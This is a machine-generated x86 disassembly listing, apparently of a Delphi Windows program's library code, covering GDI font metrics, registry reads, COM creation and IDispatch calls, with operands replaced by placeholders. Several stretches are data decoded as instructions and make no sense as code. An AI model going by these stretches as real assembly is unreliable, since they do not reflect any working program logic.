mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41b978
pop esi
pop ebx
retn
sub_42b3d4
push ebp
mov ebp esp
push ecx
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b419
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5a
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b420
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42b438
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
movzx ebx [ esp + 0x34 ]
sub_42b47c
push ebp
mov ebp esp
add esp 0xfffffef8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b57f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42b537
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
call sub_4217a0
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_421a08
test al al
je r-xdata
call sub_42b438
cmp al 0x80
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b53e
mov eax [ ebp - 0x8 ]
call sub_404650
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_422068
mov eax [ ebp - 0x8 ]
call sub_421770
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
sub_42b53e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b586
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x108 ]
mov edx [ ebp - 0x4 ]
mov ecx 0xff
call sub_4057e8
lea edx [ ebp - 0x108 ]
mov eax rw-data
mov cl 0x1f
call sub_4039ac
sub_42b658
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42b690
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_42b888
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42b6d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42b6bc
xor eax eax
push ebp
push sub_42b775
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b77c
mov eax [ ebp - 0x4 ]
call sub_42b6c8
retn
mov eax 0x10
call sub_402f00
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42b788
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42b788
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42b867
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4299b0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_4250d4
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424fb8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_418448
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_42535c
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4256cc
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42966c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b888
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42b6bc
xor eax eax
push ebp
push sub_42b8d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8dc
mov eax [ ebp - 0x4 ]
call sub_42b6c8
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b8dc
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402f1c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov eax esi
call sub_404650
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42b6bc
xor eax eax
push ebp
push sub_42b8d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8dc
mov eax [ ebp - 0x4 ]
call sub_42b6c8
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b908
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_424230
push eax
mov eax ebx
call sub_424230
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42b6d4
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42b940
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ba09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba10
retn
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
call sub_428618
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4060f8
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4060f8
sub_42ba14
clc
ja r-xdata
or al 0x0
add [ eax ] al
dec eax
mov eax [ eax ]
add [ edi + edi * 8 ] bh
add [ eax ] al
clc
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
mov ebx 0x180042
add [ eax ] al
xchg esp eax
mov edx 0x48980042
outsd
jb r-xdata
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
add [ 0xfffffffff80000ff ] bh
ja r-xdata
sbb ecx [ ebx - 0x61ec17fd ]
std
dec [ ebx - 0x742fd42a ]
retn
jo r-xdata
dec ecx
shl al 0xba
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov edx 0x100042
add [ eax ] al
cmp al 0xba
inc edx
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax * 2 + 0x53656c4f ] cl
jns r-xdata
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
test al 0x48
add [ esi ] bh
inc [ eax ]
add al bh
ja r-xdata
add ebp eax
cmp eax 0x8bfffde9
imul ebp [ edi + 0x6e ] 0xffffffff
or [ eax ] eax
add [ eax ] al
inc ecx
jo r-xdata
inc ebp
js r-xdata
inc ebp
jb r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
mov al [ 0xffffffffe8004048 ]
add [ edi ] bh
inc [ eax ]
add al bh
ja r-xdata
cwde
mov al [ 0x38bfffd ]
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
outsd
jb r-xdata
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ecx ] cl
inc ebp
dec edi
insb
inc ebp
jb r-xdata
add al 0x46
add [ eax ] ah
inc [ eax ]
add [ eax + 0x42ba ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0042ba ] cl
add [ eax ] al
add [ eax - 0x75 ] cl
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
pop esi
pop ebx
retn
movzx eax [ esi ]
sub al 0x21
jb r-xdata
sar [ esi + 0xb ] 0xf
mov dh 0x6
insd
outsb
je r-xdata
call sub_40a518
mov esi eax
mov eax [ ebx ]
call sub_40580c
test eax eax
jle r-xdata
sub edx eax
mov eax ebx
call sub_405c6c
mov eax [ ebx ]
outsd
outsb
add al ch
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or eax 0x656c4f45
inc eax
add [ ebx + edi * 4 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x45 ] dl
inc edx
add [ eax ] bl
add [ eax ] al
add [ edx + edi * 4 + 0x48980042 ] dl
mov eax [ ebx ]
call sub_4059dc
mov edx esi
sub al 0xd
je r-xdata
add [ eax ] al
sub_42bba8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_405584
mov eax [ ebx ]
call sub_40a518
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_40580c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
movzx eax [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_4059dc
mov edx esi
sub edx eax
mov eax ebx
call sub_405c6c
mov eax [ ebx ]
call sub_40a518
mov esi eax
sub al 0xd
je r-xdata
sub_42bbf8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_42bca2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4055c8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_404974
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_40dc88
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bca9
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40d2e8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
call sub_40afac
sub_42bca9
mov eax ebx
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42bccc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_42bd3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_42bba8
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_42bbf8
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_405584
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd45
lea eax [ ebp - 0x4 ]
call sub_405530
retn
add esp 0xfffffff0
call sub_404974
sub_42bd45
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42bd90
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_42bd80
mov eax esi
mov edx [ esp ]
call sub_405758
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_42bdbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42be09
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_405ea8
mov eax [ ebp - 0x4 ]
call sub_405eb8
push eax
call CLSIDFromProgID
call sub_42bd80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be10
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
sub_42be18
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_42bd80
mov eax esi
mov edx [ esp ]
call sub_405758
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_42be44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bf24
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_404c5c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40700c
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call CoCreateInstance
call sub_42bd80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf2b
lea eax [ ebp - 0x1c ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_42bf5c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov ebx eax
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_42c0fd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x28 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov eax ebx
call sub_405eb8
mov [ ebp - 0x24 ] eax
mov esi r-xdata
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_40700c
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_405ec8
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
mov ebx 0x15
mov [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
xor eax eax
lea eax [ ebp - 0x4c ]
lea edx [ ebp - 0x48 ]
mov ecx 0x10
call sub_4057a0
mov edi [ ebp - 0x4c ]
test edi edi
je r-xdata
mov ebx 0x10
jmp r-xdata
mov ebx 0x15
jmp r-xdata
lea eax [ ebp - 0x50 ]
mov edx ebx
call sub_4057d4
mov esi [ ebp - 0x50 ]
test esi esi
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x28 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call [ rw-data ]
call sub_42bd80
mov eax [ ebp - 0x4 ]
call sub_42bd80
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_407024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c104
lea eax [ ebp - 0x58 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_4060ac
retn
push esi
lea eax [ ebp - 0x54 ]
mov edx ebx
call sub_4057d4
mov eax [ ebp - 0x54 ]
call sub_4059dc
push eax
push edi
lea eax [ ebp - 0x58 ]
lea edx [ ebp - 0x48 ]
mov ecx 0x10
call sub_4057a0
mov eax [ ebp - 0x58 ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
test al al
je r-xdata
sub_42c11c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c1f1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_404c5c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42bdbc
mov eax ebx
call sub_40700c
push eax
push r-xdata
push 0x5
push 0x0
lea eax [ ebp - 0x14 ]
push eax
call CoCreateInstance
call sub_42bd80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c1f8
lea eax [ ebp - 0x18 ]
call sub_405530
retn
sub_42c22c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_42c32e
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c420
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_40700c
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_4057d4
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4057d4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bccc
jmp sub_404ec4
lea eax [ ebp - 0x8 ]
call sub_405d28
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_405d28
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_405d28
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_42c3f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c427
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_405d40
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_42c430
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x28 ] ecx
mov esi edx
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_42c75b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x30 ] eax
xor ecx ecx
push ebp
push sub_42c738
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x4
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] edi
movzx eax [ esi + 0x2 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
movzx eax [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x38 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0x2c ] 0x48
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x38 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x4c ] 0x4
inc [ ebp - 0x44 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x30 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x3c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x30 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20 ]
call sub_42ca08
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x2c ] 0xc
jne r-xdata
cmp [ ebp - 0x2c ] 0xc
jne r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
call sub_40646c
mov edx [ ebp - 0x3c ]
mov [ edx ] eax
mov eax [ ebp - 0x3c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x3c ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_40646c
mov edx [ ebp - 0x3c ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x3c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x38 ] 0x10
movzx eax [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
movzx edx dl
mov [ ebp - 0x2c ] edx
and al 0x80
cmp [ ebp - 0x2c ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c73f
mov ebx [ ebp - 0x30 ]
test ebx ebx
je r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x250 ]
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0x2c ]
mov [ eax ] edx
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0x2c ] 0x5
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0x2c ]
or eax 0x4000
mov edx [ ebp - 0x38 ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x34 ] 0x4
inc [ ebp - 0x30 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
